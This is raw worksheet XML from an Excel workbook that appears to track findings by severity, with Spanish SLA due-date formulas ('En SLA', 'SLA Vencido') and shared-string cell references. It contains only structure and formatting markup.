      <c r="AB350" t="s">
        <v>3792</v>
      </c>
      <c r="AD350" t="s">
        <v>3793</v>
      </c>
      <c r="AE350" s="65" t="s">
        <v>2975</v>
      </c>
      <c r="AG350" s="53" t="s">
        <v>1823</v>
      </c>
    </row>
    <row r="351" spans="1:33" ht="145" x14ac:dyDescent="0.35">
      <c r="A351" s="50">
        <v>346</v>
      </c>
      <c r="B351" s="50" t="s">
        <v>2044</v>
      </c>
      <c r="C351" s="50" t="s">
        <v>33</v>
      </c>
      <c r="D351" s="63" t="s">
        <v>34</v>
      </c>
      <c r="G351" s="60" t="s">
        <v>2045</v>
      </c>
      <c r="I351" t="s">
        <v>3794</v>
      </c>
      <c r="J351" s="65" t="s">
        <v>3796</v>
      </c>
      <c r="L351" s="84" t="s">
        <v>655</v>
      </c>
      <c r="M351" s="50" t="s">
        <v>61</v>
      </c>
      <c r="Q351" s="65" t="s">
        <v>3797</v>
      </c>
      <c r="T351" s="1">
        <v>46156</v>
      </c>
      <c r="U351" s="55">
        <f t="shared" ca="1" si="73"/>
        <v>53</v>
      </c>
      <c r="V351" s="1">
        <f t="shared" si="74"/>
        <v>46246</v>
      </c>
      <c r="W351" s="56" t="str">
        <f t="shared" ca="1" si="75"/>
        <v>En SLA</v>
      </c>
      <c r="AB351" s="65" t="s">
        <v>3799</v>
      </c>
      <c r="AC351" s="65" t="s">
        <v>3800</v>
      </c>
      <c r="AD351" s="65" t="s">
        <v>3798</v>
      </c>
      <c r="AE351" s="65" t="s">
        <v>2975</v>
      </c>
      <c r="AG351" s="53" t="s">
        <v>2023</v>
      </c>
    </row>
    <row r="352" spans="1:33" ht="72.5" x14ac:dyDescent="0.35">
      <c r="A352" s="50">
        <v>347</v>
      </c>
      <c r="B352" s="50" t="s">
        <v>2044</v>
      </c>
      <c r="C352" s="50" t="s">
        <v>33</v>
      </c>
      <c r="D352" s="63" t="s">
        <v>34</v>
      </c>
      <c r="G352" s="60" t="s">
        <v>2045</v>
      </c>
      <c r="I352" t="s">
        <v>3795</v>
      </c>
      <c r="J352" s="65" t="s">
        <v>126</v>
      </c>
      <c r="L352" s="84" t="s">
        <v>655</v>
      </c>
      <c r="M352" s="50" t="s">
        <v>61</v>
      </c>
      <c r="Q352" s="91" t="s">
        <v>3801</v>
      </c>
      <c r="T352" s="1">
        <v>46156</v>
      </c>
      <c r="U352" s="55">
        <f t="shared" ref="U352" ca="1" si="76">TODAY()-T352</f>
        <v>53</v>
      </c>
      <c r="V352" s="1">
        <f t="shared" ref="V352" si="77">IF(M352="Critical",T352+10,IF(M352="High",T352+30,IF(M352="Bad",T352+30,IF(M352="Medium",T352+90,IF(M352="Warm",T352+90,IF(M352="Low",T352+120,IF(M352="Fair",T352+120,IF(M352="Neutral",T352+120,""))))))))</f>
        <v>46246</v>
      </c>
      <c r="W352" s="56" t="str">
        <f t="shared" ref="W352" ca="1" si="78">IF(M352="Critical",IF(U352&gt;10,"SLA Vencido","En SLA"),IF(M352="High",IF(U352&gt;30,"SLA Vencido","En SLA"),IF(M352="Bad",IF(U352&gt;30,"SLA Vencido","En SLA"),IF(M352="Medium",IF(U352&gt;90,"SLA Vencido","En SLA"),IF(M352="Warm",IF(U352&gt;90,"SLA Vencido","En SLA"),IF(M352="Low",IF(U352&gt;120,"SLA Vencido","En SLA"),IF(M352="Fair",IF(U352&gt;120,"SLA Vencido","En SLA"),IF(M352="Neutral",IF(U352&gt;120,"SLA Vencido","En SLA"),"Error"))))))))</f>
        <v>En SLA</v>
      </c>
      <c r="AB352" s="65" t="s">
        <v>2183</v>
      </c>
      <c r="AC352" s="65" t="s">
        <v>3803</v>
      </c>
      <c r="AD352" s="65" t="s">
        <v>3802</v>
      </c>
      <c r="AE352" s="65" t="s">
        <v>2975</v>
      </c>
      <c r="AG352" s="53" t="s">
        <v>2023</v>
      </c>
    </row>
    <row r="353" spans="1:2" x14ac:dyDescent="0.35">
      <c r="A353" s="50">
        <v>348</v>
      </c>
      <c r="B353" s="50" t="s">
        <v>2044</v>
      </c>
    </row>
  </sheetData>
  <autoFilter ref="A1:AG353" xr:uid="{0C93C0F0-ED8F-4E3E-A683-B1EF1027D1A4}"/>
  <phoneticPr fontId="23" type="noConversion"/>
  <conditionalFormatting sqref="H142:H228">
    <cfRule type="duplicateValues" dxfId="4" priority="43" stopIfTrue="1"/>
  </conditionalFormatting>
  <conditionalFormatting sqref="H2:I141">
    <cfRule type="duplicateValues" dxfId="3" priority="72" stopIfTrue="1"/>
  </conditionalFormatting>
  <conditionalFormatting sqref="H250:I253 H1:I215 H255:I255 H254 H231:H249 H259:I287 H298:I299 I297 H308:I319 I305:I307 H301:I304 I300 H293:I296 I290:I292 H289:I289 I288 H218:I228 H216:H217 H320:H323 H324:I1048576 K349">
    <cfRule type="duplicateValues" dxfId="2" priority="75" stopIfTrue="1"/>
  </conditionalFormatting>
  <conditionalFormatting sqref="H256:I258">
    <cfRule type="duplicateValues" dxfId="1" priority="2" stopIfTrue="1"/>
  </conditionalFormatting>
  <conditionalFormatting sqref="I142:I215 I218:I228">
    <cfRule type="duplicateValues" dxfId="0" priority="48" stopIfTrue="1"/>
  </conditionalFormatting>
  <hyperlinks>
    <hyperlink ref="Q6" r:id="rId1" xr:uid="{12B3A38C-5C14-4FBC-9A51-6F95C00EE2E1}"/>
    <hyperlink ref="Q28" r:id="rId2" xr:uid="{3CB208FE-5D9F-400A-B4DB-D83023D8ACBB}"/>
    <hyperlink ref="Q138" r:id="rId3" xr:uid="{B78A8E03-AF8D-4248-9B1F-C94D604C562C}"/>
    <hyperlink ref="Q128" r:id="rId4" xr:uid="{15641020-CFC6-4EE7-968D-24D3964D0162}"/>
    <hyperlink ref="Q335" r:id="rId5" xr:uid="{60091685-ABD7-4A5E-88FA-5660DAD4F97D}"/>
    <hyperlink ref="Q338" r:id="rId6" xr:uid="{241FA5CB-4D06-4AB2-87F3-40245E8D5ED8}"/>
    <hyperlink ref="Q337" r:id="rId7" xr:uid="{62821F52-F312-4054-B467-46AC6C9C25F0}"/>
    <hyperlink ref="Q336" r:id="rId8" xr:uid="{3BEACCED-B6DF-4C51-B26C-45859AC76E43}"/>
    <hyperlink ref="Q340" r:id="rId9" xr:uid="{5532625B-457F-4076-9BC1-DD69AAB55CB7}"/>
    <hyperlink ref="Q339" r:id="rId10" xr:uid="{E4748879-532D-4295-AB0F-A7141F7EA03E}"/>
    <hyperlink ref="Q352" r:id="rId11" xr:uid="{AC8E1363-D11E-4DCE-89B6-3C948B75460C}"/>
  </hyperlinks>
  <pageMargins left="0.7" right="0.7" top="0.75" bottom="0.75" header="0.3" footer="0.3"/>
  <ignoredErrors>
    <ignoredError sqref="R41:R42" numberStoredAsText="1"/>
  </ignoredErrors>
  <legacy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28C2C-0990-4089-B31E-EC6620EB96AE}">
  <dimension ref="B2:J7"/>
  <sheetViews>
    <sheetView workbookViewId="0">
      <selection activeCell="H4" sqref="H4"/>
    </sheetView>
  </sheetViews>
  <sheetFormatPr baseColWidth="10" defaultRowHeight="14.5" x14ac:dyDescent="0.35"/>
  <cols>
    <col min="7" max="7" width="31.26953125" customWidth="1"/>
    <col min="8" max="8" width="39.08984375" customWidth="1"/>
    <col min="10" max="10" width="36" customWidth="1"/>
  </cols>
  <sheetData>
    <row r="2" spans="2:10" ht="15" thickBot="1" x14ac:dyDescent="0.4"/>
    <row r="3" spans="2:10" ht="48.5" thickBot="1" x14ac:dyDescent="0.4">
      <c r="B3" s="94" t="s">
        <v>3808</v>
      </c>
      <c r="C3" s="94" t="s">
        <v>3809</v>
      </c>
      <c r="D3" s="94" t="s">
        <v>3810</v>
      </c>
      <c r="E3" s="94" t="s">
        <v>3811</v>
      </c>
      <c r="F3" s="94" t="s">
        <v>3812</v>
      </c>
      <c r="G3" s="94" t="s">
        <v>3813</v>
      </c>
      <c r="H3" s="94" t="s">
        <v>3814</v>
      </c>
      <c r="I3" s="94" t="s">
        <v>3815</v>
      </c>
      <c r="J3" s="94" t="s">
        <v>3816</v>
      </c>
    </row>
    <row r="4" spans="2:10" ht="48.5" thickBot="1" x14ac:dyDescent="0.4">
      <c r="B4" s="95" t="s">
        <v>3817</v>
      </c>
      <c r="C4" s="95" t="s">
        <v>3818</v>
      </c>
      <c r="D4" s="95" t="s">
        <v>3819</v>
      </c>
      <c r="E4" s="95" t="s">
        <v>3820</v>
      </c>
      <c r="F4" s="95" t="s">
        <v>3821</v>
      </c>
      <c r="G4" s="95" t="s">
        <v>3822</v>
      </c>
      <c r="H4" s="95">
        <v>219706561</v>
      </c>
      <c r="I4" s="95" t="s">
        <v>3412</v>
      </c>
      <c r="J4" s="95">
        <v>1</v>
      </c>
    </row>
    <row r="5" spans="2:10" ht="80.5" thickBot="1" x14ac:dyDescent="0.4">
      <c r="B5" s="95" t="s">
        <v>3823</v>
      </c>
      <c r="C5" s="95" t="s">
        <v>3824</v>
      </c>
      <c r="D5" s="95" t="s">
        <v>3819</v>
      </c>
      <c r="E5" s="95" t="s">
        <v>3820</v>
      </c>
      <c r="F5" s="95" t="s">
        <v>3825</v>
      </c>
      <c r="G5" s="95" t="s">
        <v>3826</v>
      </c>
      <c r="H5" s="95">
        <v>171024683</v>
      </c>
      <c r="I5" s="95" t="s">
        <v>3412</v>
      </c>
      <c r="J5" s="95">
        <v>1</v>
      </c>
    </row>
    <row r="6" spans="2:10" ht="32.5" thickBot="1" x14ac:dyDescent="0.4">
      <c r="B6" s="95" t="s">
        <v>3827</v>
      </c>
      <c r="C6" s="95"/>
      <c r="D6" s="95" t="s">
        <v>3819</v>
      </c>
      <c r="E6" s="95" t="s">
        <v>3820</v>
      </c>
      <c r="F6" s="95" t="s">
        <v>3828</v>
      </c>
      <c r="G6" s="95" t="s">
        <v>3829</v>
      </c>
      <c r="H6" s="95">
        <v>231257278</v>
      </c>
      <c r="I6" s="95" t="s">
        <v>3412</v>
      </c>
      <c r="J6" s="95">
        <v>1</v>
      </c>
    </row>
    <row r="7" spans="2:10" ht="32.5" thickBot="1" x14ac:dyDescent="0.4">
      <c r="B7" s="95" t="s">
        <v>3827</v>
      </c>
      <c r="C7" s="95"/>
      <c r="D7" s="95" t="s">
        <v>3819</v>
      </c>
      <c r="E7" s="95" t="s">
        <v>3820</v>
      </c>
      <c r="F7" s="95" t="s">
        <v>3830</v>
      </c>
      <c r="G7" s="95" t="s">
        <v>3831</v>
      </c>
      <c r="H7" s="95">
        <v>232522488</v>
      </c>
      <c r="I7" s="95" t="s">
        <v>3412</v>
      </c>
      <c r="J7" s="9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3"/>
  <sheetViews>
    <sheetView topLeftCell="I1" zoomScale="90" zoomScaleNormal="90" workbookViewId="0">
      <pane ySplit="1" topLeftCell="A2" activePane="bottomLeft" state="frozen"/>
      <selection activeCell="I1" sqref="I1"/>
      <selection pane="bottomLeft" activeCell="O8" sqref="O8"/>
    </sheetView>
  </sheetViews>
  <sheetFormatPr baseColWidth="10" defaultColWidth="11.453125" defaultRowHeight="14.5" outlineLevelCol="1" x14ac:dyDescent="0.35"/>
  <cols>
    <col min="1" max="1" width="27.81640625" bestFit="1" customWidth="1"/>
    <col min="2" max="2" width="75.453125" bestFit="1" customWidth="1"/>
    <col min="3" max="3" width="60.7265625" customWidth="1" outlineLevel="1"/>
    <col min="4" max="4" width="19.54296875" customWidth="1" outlineLevel="1"/>
    <col min="5" max="5" width="14.453125" customWidth="1" outlineLevel="1"/>
    <col min="6" max="6" width="49" customWidth="1" outlineLevel="1"/>
    <col min="7" max="7" width="20" customWidth="1" outlineLevel="1"/>
    <col min="8" max="8" width="41.54296875" customWidth="1" outlineLevel="1"/>
    <col min="9" max="9" width="24" customWidth="1" outlineLevel="1"/>
    <col min="10" max="10" width="14.453125" customWidth="1" outlineLevel="1"/>
    <col min="11" max="11" width="11.453125" customWidth="1" outlineLevel="1"/>
    <col min="12" max="13" width="11.453125" customWidth="1"/>
    <col min="14" max="15" width="18" customWidth="1"/>
    <col min="16" max="16" width="33.453125" bestFit="1" customWidth="1"/>
  </cols>
  <sheetData>
    <row r="1" spans="1:16" x14ac:dyDescent="0.35">
      <c r="A1" s="2" t="s">
        <v>3166</v>
      </c>
      <c r="B1" s="2" t="s">
        <v>3167</v>
      </c>
      <c r="C1" s="2" t="s">
        <v>3168</v>
      </c>
      <c r="D1" s="2" t="s">
        <v>3169</v>
      </c>
      <c r="E1" s="2" t="s">
        <v>3170</v>
      </c>
      <c r="F1" s="2" t="s">
        <v>3171</v>
      </c>
      <c r="G1" s="2" t="s">
        <v>3172</v>
      </c>
      <c r="H1" s="2" t="s">
        <v>3173</v>
      </c>
      <c r="I1" s="2" t="s">
        <v>3174</v>
      </c>
      <c r="J1" s="2" t="s">
        <v>3175</v>
      </c>
      <c r="K1" s="2" t="s">
        <v>3176</v>
      </c>
      <c r="L1" s="38" t="s">
        <v>3177</v>
      </c>
      <c r="M1" s="47" t="s">
        <v>3178</v>
      </c>
      <c r="N1" s="47" t="s">
        <v>3179</v>
      </c>
      <c r="O1" s="47" t="s">
        <v>3180</v>
      </c>
      <c r="P1" s="47" t="s">
        <v>3181</v>
      </c>
    </row>
    <row r="2" spans="1:16" x14ac:dyDescent="0.35">
      <c r="A2" s="19" t="s">
        <v>43</v>
      </c>
      <c r="B2" s="19" t="s">
        <v>3182</v>
      </c>
      <c r="C2" s="19" t="s">
        <v>37</v>
      </c>
      <c r="D2" s="24" t="s">
        <v>3183</v>
      </c>
      <c r="E2" s="24" t="s">
        <v>32</v>
      </c>
      <c r="F2" s="24"/>
      <c r="G2" s="24"/>
      <c r="H2" s="24"/>
      <c r="I2" s="24"/>
      <c r="J2" s="24"/>
      <c r="K2" s="24" t="s">
        <v>3184</v>
      </c>
      <c r="L2" s="24"/>
      <c r="M2" s="24"/>
      <c r="N2" s="24"/>
      <c r="O2" s="24"/>
      <c r="P2" s="24"/>
    </row>
    <row r="3" spans="1:16" x14ac:dyDescent="0.35">
      <c r="A3" s="19" t="s">
        <v>3185</v>
      </c>
      <c r="B3" s="19" t="s">
        <v>176</v>
      </c>
      <c r="C3" s="19" t="s">
        <v>3186</v>
      </c>
      <c r="D3" s="24" t="s">
        <v>3183</v>
      </c>
      <c r="E3" s="24" t="s">
        <v>32</v>
      </c>
      <c r="F3" s="24" t="s">
        <v>3187</v>
      </c>
      <c r="G3" s="24" t="s">
        <v>3188</v>
      </c>
      <c r="H3" s="24" t="s">
        <v>3189</v>
      </c>
      <c r="I3" s="24" t="s">
        <v>3190</v>
      </c>
      <c r="J3" s="24" t="s">
        <v>3191</v>
      </c>
      <c r="K3" s="24" t="s">
        <v>3192</v>
      </c>
      <c r="L3" s="24" t="s">
        <v>3193</v>
      </c>
      <c r="M3" s="24" t="s">
        <v>3193</v>
      </c>
      <c r="N3" s="24" t="s">
        <v>325</v>
      </c>
      <c r="O3" s="24"/>
      <c r="P3" s="24" t="s">
        <v>1422</v>
      </c>
    </row>
    <row r="4" spans="1:16" x14ac:dyDescent="0.35">
      <c r="A4" s="19" t="s">
        <v>3185</v>
      </c>
      <c r="B4" s="19" t="s">
        <v>3194</v>
      </c>
      <c r="C4" s="19" t="s">
        <v>445</v>
      </c>
      <c r="D4" s="24" t="s">
        <v>3183</v>
      </c>
      <c r="E4" s="24" t="s">
        <v>32</v>
      </c>
      <c r="F4" s="24"/>
      <c r="G4" s="24"/>
      <c r="H4" s="24"/>
      <c r="I4" s="24" t="s">
        <v>3190</v>
      </c>
      <c r="J4" s="24" t="s">
        <v>3191</v>
      </c>
      <c r="K4" s="24" t="s">
        <v>3184</v>
      </c>
      <c r="L4" s="24" t="s">
        <v>3195</v>
      </c>
      <c r="M4" s="24"/>
      <c r="N4" s="24"/>
      <c r="O4" s="24"/>
      <c r="P4" s="24"/>
    </row>
    <row r="5" spans="1:16" x14ac:dyDescent="0.35">
      <c r="A5" s="19" t="s">
        <v>3196</v>
      </c>
      <c r="B5" s="19" t="s">
        <v>999</v>
      </c>
      <c r="C5" s="19" t="s">
        <v>739</v>
      </c>
      <c r="D5" s="24" t="s">
        <v>3197</v>
      </c>
      <c r="E5" s="24" t="s">
        <v>32</v>
      </c>
      <c r="F5" s="24" t="s">
        <v>3198</v>
      </c>
      <c r="G5" s="24" t="s">
        <v>3199</v>
      </c>
      <c r="H5" s="24" t="s">
        <v>3200</v>
      </c>
      <c r="I5" s="24" t="s">
        <v>3190</v>
      </c>
      <c r="J5" s="24" t="s">
        <v>3191</v>
      </c>
      <c r="K5" s="24" t="s">
        <v>3192</v>
      </c>
      <c r="L5" s="24" t="s">
        <v>3195</v>
      </c>
      <c r="M5" s="24" t="s">
        <v>3195</v>
      </c>
      <c r="N5" s="24" t="s">
        <v>3193</v>
      </c>
      <c r="O5" s="24">
        <v>3</v>
      </c>
      <c r="P5" s="24" t="s">
        <v>3201</v>
      </c>
    </row>
    <row r="6" spans="1:16" x14ac:dyDescent="0.35">
      <c r="A6" s="19" t="s">
        <v>3202</v>
      </c>
      <c r="B6" s="19"/>
      <c r="C6" s="19" t="s">
        <v>3203</v>
      </c>
      <c r="D6" s="24" t="s">
        <v>371</v>
      </c>
      <c r="E6" s="24" t="s">
        <v>32</v>
      </c>
      <c r="F6" s="24"/>
      <c r="G6" s="24"/>
      <c r="H6" s="24"/>
      <c r="I6" s="24" t="s">
        <v>3204</v>
      </c>
      <c r="J6" s="24"/>
      <c r="K6" s="24" t="s">
        <v>3192</v>
      </c>
      <c r="L6" s="24" t="s">
        <v>3193</v>
      </c>
      <c r="M6" s="24"/>
      <c r="N6" s="24"/>
      <c r="O6" s="24"/>
      <c r="P6" s="24"/>
    </row>
    <row r="7" spans="1:16" x14ac:dyDescent="0.35">
      <c r="A7" s="23">
        <v>190216136240</v>
      </c>
      <c r="B7" s="19"/>
      <c r="C7" s="19" t="s">
        <v>3205</v>
      </c>
      <c r="D7" s="24" t="s">
        <v>371</v>
      </c>
      <c r="E7" s="24" t="s">
        <v>32</v>
      </c>
      <c r="F7" s="24"/>
      <c r="G7" s="24"/>
      <c r="H7" s="24"/>
      <c r="I7" s="24" t="s">
        <v>3204</v>
      </c>
      <c r="J7" s="24"/>
      <c r="K7" s="24" t="s">
        <v>3192</v>
      </c>
      <c r="L7" s="24" t="s">
        <v>3193</v>
      </c>
      <c r="M7" s="24"/>
      <c r="N7" s="24"/>
      <c r="O7" s="24"/>
      <c r="P7" s="24"/>
    </row>
    <row r="8" spans="1:16" x14ac:dyDescent="0.35">
      <c r="A8" s="19" t="s">
        <v>273</v>
      </c>
      <c r="B8" s="19"/>
      <c r="C8" s="19" t="s">
        <v>3206</v>
      </c>
      <c r="D8" s="24" t="s">
        <v>371</v>
      </c>
      <c r="E8" s="24" t="s">
        <v>32</v>
      </c>
      <c r="F8" s="24"/>
      <c r="G8" s="24"/>
      <c r="H8" s="24"/>
      <c r="I8" s="24" t="s">
        <v>3204</v>
      </c>
      <c r="J8" s="24"/>
      <c r="K8" s="24" t="s">
        <v>3192</v>
      </c>
      <c r="L8" s="24" t="s">
        <v>3193</v>
      </c>
      <c r="M8" s="24"/>
      <c r="N8" s="24"/>
      <c r="O8" s="24"/>
      <c r="P8" s="24"/>
    </row>
    <row r="9" spans="1:16" x14ac:dyDescent="0.35">
      <c r="A9" s="19" t="s">
        <v>247</v>
      </c>
      <c r="B9" s="19"/>
      <c r="C9" s="19" t="s">
        <v>3207</v>
      </c>
      <c r="D9" s="24" t="s">
        <v>371</v>
      </c>
      <c r="E9" s="24" t="s">
        <v>32</v>
      </c>
      <c r="F9" s="24"/>
      <c r="G9" s="24"/>
      <c r="H9" s="24"/>
      <c r="I9" s="24" t="s">
        <v>3204</v>
      </c>
      <c r="J9" s="24"/>
      <c r="K9" s="24" t="s">
        <v>3192</v>
      </c>
      <c r="L9" s="24" t="s">
        <v>3193</v>
      </c>
      <c r="M9" s="24"/>
      <c r="N9" s="24"/>
      <c r="O9" s="24"/>
      <c r="P9" s="24"/>
    </row>
    <row r="10" spans="1:16" x14ac:dyDescent="0.35">
      <c r="A10" s="19" t="s">
        <v>3208</v>
      </c>
      <c r="B10" s="19" t="s">
        <v>3209</v>
      </c>
      <c r="C10" s="19"/>
      <c r="D10" s="24" t="s">
        <v>3183</v>
      </c>
      <c r="E10" s="24" t="s">
        <v>3210</v>
      </c>
      <c r="F10" s="24"/>
      <c r="G10" s="24"/>
      <c r="H10" s="24"/>
      <c r="I10" s="24"/>
      <c r="J10" s="24"/>
      <c r="K10" s="24" t="s">
        <v>3184</v>
      </c>
      <c r="L10" s="24"/>
      <c r="M10" s="24"/>
      <c r="N10" s="24"/>
      <c r="O10" s="24"/>
      <c r="P10" s="24"/>
    </row>
    <row r="11" spans="1:16" x14ac:dyDescent="0.35">
      <c r="A11" s="19" t="s">
        <v>3211</v>
      </c>
      <c r="B11" s="19" t="s">
        <v>3212</v>
      </c>
      <c r="C11" s="19" t="s">
        <v>3213</v>
      </c>
      <c r="D11" s="24" t="s">
        <v>3183</v>
      </c>
      <c r="E11" s="24" t="s">
        <v>3210</v>
      </c>
      <c r="F11" s="24"/>
      <c r="G11" s="24"/>
      <c r="H11" s="24"/>
      <c r="I11" s="24"/>
      <c r="J11" s="24"/>
      <c r="K11" s="24" t="s">
        <v>3184</v>
      </c>
      <c r="L11" s="24"/>
      <c r="M11" s="24"/>
      <c r="N11" s="24"/>
      <c r="O11" s="24"/>
      <c r="P11" s="24"/>
    </row>
    <row r="12" spans="1:16" x14ac:dyDescent="0.35">
      <c r="A12" s="23">
        <v>191234169146</v>
      </c>
      <c r="B12" s="19" t="s">
        <v>3214</v>
      </c>
      <c r="C12" s="19"/>
      <c r="D12" s="24" t="s">
        <v>3183</v>
      </c>
      <c r="E12" s="24" t="s">
        <v>3210</v>
      </c>
      <c r="F12" s="24"/>
      <c r="G12" s="24"/>
      <c r="H12" s="24"/>
      <c r="I12" s="24"/>
      <c r="J12" s="24"/>
      <c r="K12" s="24" t="s">
        <v>3184</v>
      </c>
      <c r="L12" s="24"/>
      <c r="M12" s="24"/>
      <c r="N12" s="24"/>
      <c r="O12" s="24"/>
      <c r="P12" s="24"/>
    </row>
    <row r="13" spans="1:16" x14ac:dyDescent="0.35">
      <c r="A13" s="19" t="s">
        <v>3215</v>
      </c>
      <c r="B13" s="19" t="s">
        <v>3216</v>
      </c>
      <c r="C13" s="19"/>
      <c r="D13" s="24" t="s">
        <v>3183</v>
      </c>
      <c r="E13" s="24" t="s">
        <v>3210</v>
      </c>
      <c r="F13" s="24"/>
      <c r="G13" s="24"/>
      <c r="H13" s="24"/>
      <c r="I13" s="24"/>
      <c r="J13" s="24"/>
      <c r="K13" s="24" t="s">
        <v>3184</v>
      </c>
      <c r="L13" s="24"/>
      <c r="M13" s="24"/>
      <c r="N13" s="24"/>
      <c r="O13" s="24"/>
      <c r="P13" s="24"/>
    </row>
    <row r="14" spans="1:16" x14ac:dyDescent="0.35">
      <c r="A14" s="23">
        <v>190145127235</v>
      </c>
      <c r="B14" s="19" t="s">
        <v>2107</v>
      </c>
      <c r="C14" s="19" t="s">
        <v>3217</v>
      </c>
      <c r="D14" s="24" t="s">
        <v>3183</v>
      </c>
      <c r="E14" s="24" t="s">
        <v>2044</v>
      </c>
      <c r="F14" s="24" t="s">
        <v>3198</v>
      </c>
      <c r="G14" s="24" t="s">
        <v>3199</v>
      </c>
      <c r="H14" s="24" t="s">
        <v>3200</v>
      </c>
      <c r="I14" s="24"/>
      <c r="J14" s="24" t="s">
        <v>3191</v>
      </c>
      <c r="K14" s="24" t="s">
        <v>3192</v>
      </c>
      <c r="L14" s="24" t="s">
        <v>3195</v>
      </c>
      <c r="M14" s="24" t="s">
        <v>3193</v>
      </c>
      <c r="N14" s="24" t="s">
        <v>3193</v>
      </c>
      <c r="O14" s="24"/>
      <c r="P14" s="24" t="s">
        <v>1179</v>
      </c>
    </row>
    <row r="15" spans="1:16" x14ac:dyDescent="0.35">
      <c r="A15" s="23" t="s">
        <v>3218</v>
      </c>
      <c r="B15" s="85" t="s">
        <v>1168</v>
      </c>
      <c r="C15" s="19" t="s">
        <v>3219</v>
      </c>
      <c r="D15" s="24" t="s">
        <v>3183</v>
      </c>
      <c r="E15" s="24" t="s">
        <v>32</v>
      </c>
      <c r="F15" s="24" t="s">
        <v>3198</v>
      </c>
      <c r="G15" s="24" t="s">
        <v>3199</v>
      </c>
      <c r="H15" s="24" t="s">
        <v>3220</v>
      </c>
      <c r="I15" s="24"/>
      <c r="J15" s="24"/>
      <c r="K15" s="24" t="s">
        <v>3192</v>
      </c>
      <c r="L15" s="24" t="s">
        <v>3195</v>
      </c>
      <c r="M15" s="24" t="s">
        <v>3195</v>
      </c>
      <c r="N15" s="24" t="s">
        <v>3193</v>
      </c>
      <c r="O15" s="24">
        <v>6</v>
      </c>
      <c r="P15" s="24" t="s">
        <v>1179</v>
      </c>
    </row>
    <row r="16" spans="1:16" x14ac:dyDescent="0.35">
      <c r="A16" s="19" t="s">
        <v>3211</v>
      </c>
      <c r="B16" s="19" t="s">
        <v>3221</v>
      </c>
      <c r="C16" s="19" t="s">
        <v>3222</v>
      </c>
      <c r="D16" s="24" t="s">
        <v>3183</v>
      </c>
      <c r="E16" s="24" t="s">
        <v>3210</v>
      </c>
      <c r="F16" s="24"/>
      <c r="G16" s="24"/>
      <c r="H16" s="24"/>
      <c r="I16" s="24"/>
      <c r="J16" s="24"/>
      <c r="K16" s="24" t="s">
        <v>3184</v>
      </c>
      <c r="L16" s="24"/>
      <c r="M16" s="24"/>
      <c r="N16" s="24"/>
      <c r="O16" s="24"/>
      <c r="P16" s="24"/>
    </row>
    <row r="17" spans="1:16" x14ac:dyDescent="0.35">
      <c r="A17" s="19" t="s">
        <v>3215</v>
      </c>
      <c r="B17" s="19" t="s">
        <v>3223</v>
      </c>
      <c r="C17" s="19" t="s">
        <v>3224</v>
      </c>
      <c r="D17" s="24" t="s">
        <v>3183</v>
      </c>
      <c r="E17" s="24" t="s">
        <v>3210</v>
      </c>
      <c r="F17" s="24"/>
      <c r="G17" s="24"/>
      <c r="H17" s="24"/>
      <c r="I17" s="24"/>
      <c r="J17" s="24"/>
      <c r="K17" s="24" t="s">
        <v>3184</v>
      </c>
      <c r="L17" s="24"/>
      <c r="M17" s="24"/>
      <c r="N17" s="24"/>
      <c r="O17" s="24"/>
      <c r="P17" s="24"/>
    </row>
    <row r="18" spans="1:16" x14ac:dyDescent="0.35">
      <c r="A18" s="19" t="s">
        <v>3225</v>
      </c>
      <c r="B18" s="19" t="s">
        <v>3226</v>
      </c>
      <c r="C18" s="19" t="s">
        <v>3227</v>
      </c>
      <c r="D18" s="24" t="s">
        <v>3183</v>
      </c>
      <c r="E18" s="24" t="s">
        <v>3210</v>
      </c>
      <c r="F18" s="24"/>
      <c r="G18" s="24"/>
      <c r="H18" s="24"/>
      <c r="I18" s="24"/>
      <c r="J18" s="24"/>
      <c r="K18" s="24" t="s">
        <v>3184</v>
      </c>
      <c r="L18" s="24"/>
      <c r="M18" s="24"/>
      <c r="N18" s="24"/>
      <c r="O18" s="24"/>
      <c r="P18" s="24"/>
    </row>
    <row r="19" spans="1:16" x14ac:dyDescent="0.35">
      <c r="A19" s="19" t="s">
        <v>3225</v>
      </c>
      <c r="B19" s="19" t="s">
        <v>3228</v>
      </c>
      <c r="C19" s="19" t="s">
        <v>3229</v>
      </c>
      <c r="D19" s="24" t="s">
        <v>3197</v>
      </c>
      <c r="E19" s="24" t="s">
        <v>3210</v>
      </c>
      <c r="F19" s="24"/>
      <c r="G19" s="24"/>
      <c r="H19" s="24"/>
      <c r="I19" s="24"/>
      <c r="J19" s="24"/>
      <c r="K19" s="24" t="s">
        <v>3184</v>
      </c>
      <c r="L19" s="24"/>
      <c r="M19" s="24"/>
      <c r="N19" s="24"/>
      <c r="O19" s="24"/>
      <c r="P19" s="24"/>
    </row>
    <row r="20" spans="1:16" x14ac:dyDescent="0.35">
      <c r="A20" s="19" t="s">
        <v>3225</v>
      </c>
      <c r="B20" s="19" t="s">
        <v>3230</v>
      </c>
      <c r="C20" s="19" t="s">
        <v>3229</v>
      </c>
      <c r="D20" s="24" t="s">
        <v>3197</v>
      </c>
      <c r="E20" s="24" t="s">
        <v>3210</v>
      </c>
      <c r="F20" s="24"/>
      <c r="G20" s="24"/>
      <c r="H20" s="24"/>
      <c r="I20" s="24"/>
      <c r="J20" s="24"/>
      <c r="K20" s="24" t="s">
        <v>3184</v>
      </c>
      <c r="L20" s="24"/>
      <c r="M20" s="24"/>
      <c r="N20" s="24"/>
      <c r="O20" s="24"/>
      <c r="P20" s="24"/>
    </row>
    <row r="21" spans="1:16" x14ac:dyDescent="0.35">
      <c r="A21" s="19" t="s">
        <v>3225</v>
      </c>
      <c r="B21" s="19" t="s">
        <v>3231</v>
      </c>
      <c r="C21" s="19" t="s">
        <v>3229</v>
      </c>
      <c r="D21" s="24" t="s">
        <v>3197</v>
      </c>
      <c r="E21" s="24" t="s">
        <v>3210</v>
      </c>
      <c r="F21" s="24"/>
      <c r="G21" s="24"/>
      <c r="H21" s="24"/>
      <c r="I21" s="24"/>
      <c r="J21" s="24"/>
      <c r="K21" s="24" t="s">
        <v>3184</v>
      </c>
      <c r="L21" s="24"/>
      <c r="M21" s="24"/>
      <c r="N21" s="24"/>
      <c r="O21" s="24"/>
      <c r="P21" s="24"/>
    </row>
    <row r="22" spans="1:16" x14ac:dyDescent="0.35">
      <c r="A22" s="19" t="s">
        <v>3225</v>
      </c>
      <c r="B22" s="19" t="s">
        <v>3232</v>
      </c>
      <c r="C22" s="19" t="s">
        <v>3233</v>
      </c>
      <c r="D22" s="24" t="s">
        <v>3183</v>
      </c>
      <c r="E22" s="24" t="s">
        <v>3210</v>
      </c>
      <c r="F22" s="24"/>
      <c r="G22" s="24"/>
